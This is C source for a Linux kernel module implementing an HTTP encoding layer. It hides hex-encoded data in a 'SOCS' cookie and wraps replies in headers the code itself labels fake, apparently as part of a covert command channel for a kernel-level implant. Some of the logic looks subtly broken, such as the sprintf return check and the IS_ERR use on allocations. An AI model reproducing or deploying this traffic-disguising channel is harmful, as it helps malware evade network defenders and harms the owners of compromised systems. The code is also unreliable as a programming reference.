#include <linux/types.h>
#include <linux/string.h>
#include <linux/base64.h>

#include "../../sys/crypto.h"
#include "../../sys/mem.h"

#include "http.h"

#define HTTP_COOKIE_NAME "SOCS"
#define SEARCH_STRING HTTP_COOKIE_NAME "="

#define HTTP_COOKIE_HDR "Set-Cookie: " HTTP_COOKIE_NAME "=%.*s; expires=Sun, 25-Aug-2024 20:12:26 GMT; path=/; Secure; HttpOnly; priority=high\r\n"

#define HTTP_STAT_OK_NAME "200 OK"
#define HTTP_STAT_UNPROC_NAME "422 Unprocessable Content"

#define HTTP_PROTO "HTTP/2"
#define HTTP_FAKE_HEADERS "Vary: origin\r\n" \
                        "Access-Control-Allow-Credentials: true\r\n" \
                        "Access-Control-Allow-Methods: GET\r\n" \
                        "Access-Control-Allow-Headers: authorization\r\n" \
                        "Content-Type: text/html\r\n" \
                        "Server: ESF\r\n" \
                        "Content-Length: 0\r\n" \
                        "X-Xss-Protection: 0\r\n" \
                        "X-Frame-Options: SAMEORIGIN\r\n" \
                        "X-Content-Type-Options: nosniff\r\n"

#define HTTP_RES(name, cookie_hdr)  HTTP_PROTO " " name "\r\n" \
                        HTTP_FAKE_HEADERS \
                        cookie_hdr\
                        "\r"

#define HTTP_RES_OK HTTP_RES(HTTP_STAT_OK_NAME, HTTP_COOKIE_HDR)
#define HTTP_RES_UNPROC HTTP_RES(HTTP_STAT_UNPROC_NAME, "")

enum {
    HTTP_STAT_OK = 200,
    HTTP_STAT_UNPROC = 422
};

// basically greps for SEARCH_STRING and does hex decode()
static int enc_http_decode(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
{
    char *search_start;
    char *cookie_start;
    size_t cookie_size;

    search_start = strnstr(req_buf, SEARCH_STRING, req_buflen);
    if (search_start == NULL)
        return -EINVAL;

    cookie_start = search_start + strlen(SEARCH_STRING);

    // strchr but with multiple chars, and stop when buflen is met
    for (cookie_size = 0; (void*)(cookie_start + cookie_size) < (void*)(req_buf + req_buflen) && IS_HEX(cookie_start[cookie_size]); cookie_size++);

    return hex_decode(cookie_start, cookie_size, res_buf, res_buflen);
}

// should resolve at compile time
static int set_http_unproc(u8 **res_buf, size_t *res_buflen)
{
    int retv;

    *res_buflen = strlen(HTTP_RES_UNPROC);
    *res_buf = kzmalloc(*res_buflen, GFP_KERNEL);
    if (IS_ERR(*res_buf))
    {
        retv = PTR_ERR(*res_buf);
        *res_buf = NULL;
        *res_buflen = 0;
        return retv;
    }

    memcpy(*res_buf, HTTP_RES_UNPROC, *res_buflen);

    return 0;
}

static int set_http_ok(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
{
    u8 *encoded_buf = NULL;
    size_t encoded_buflen = 0;
    int retv;

    retv = hex_encode(req_buf, req_buflen, &encoded_buf, &encoded_buflen);
    if (retv < 0)
        goto LAB_ERR_NO_RES_BUF;
    
    *res_buflen = strlen(HTTP_RES_OK) - 4 + encoded_buflen + 1;
    *res_buf = kzmalloc(*res_buflen, GFP_KERNEL);
    if (IS_ERR(*res_buf))
        goto LAB_ERR_NO_RES_BUF;

    retv = sprintf(*res_buf, HTTP_RES_OK, (int)encoded_buflen, encoded_buf);
    kzfree(encoded_buf, encoded_buflen);
    if (retv != 2)
        goto LAB_ERR; // will not send internal server error due to complexity    
    
    (*res_buf)[*res_buflen-1] = '\n'; // fix sprintf not supporting no NB at end

    return 0;

LAB_ERR:
    kzfree(*res_buf, *res_buflen);
LAB_ERR_NO_RES_BUF:
    *res_buf = NULL;
    *res_buflen = 0;

    return set_http_unproc(res_buf, res_buflen);
}

static int enc_http_encode(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen, unsigned int status_code)
{    
    switch (status_code)
    {
        case HTTP_STAT_OK:
            return set_http_ok(req_buf, req_buflen, res_buf, res_buflen);
        case HTTP_STAT_UNPROC:
            return set_http_unproc(res_buf, res_buflen);
        default:
            return -EINVAL;
    }
}

int enc_http_process(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen, size_t index)
{
    u8 *decoded_buf = NULL;
    size_t decoded_buflen = 0;
    u8 *next_res_buf = NULL;
    size_t next_res_buflen = 0;
    int retv;

    retv = enc_http_decode(req_buf, req_buflen, &decoded_buf, &decoded_buflen);
    if (retv < 0)
    {
        enc_http_encode(NULL, 0, res_buf, res_buflen, HTTP_STAT_UNPROC);
        return retv;
    }

    call_next_encoding(decoded_buf, decoded_buflen, &next_res_buf, &next_res_buflen, index+1);
    kzfree(decoded_buf, decoded_buflen);

    retv = enc_http_encode(next_res_buf, next_res_buflen, res_buf, res_buflen, HTTP_STAT_OK);
    kzfree(next_res_buf, next_res_buflen);

    if (retv < 0)
        return retv;

    return 0;
}
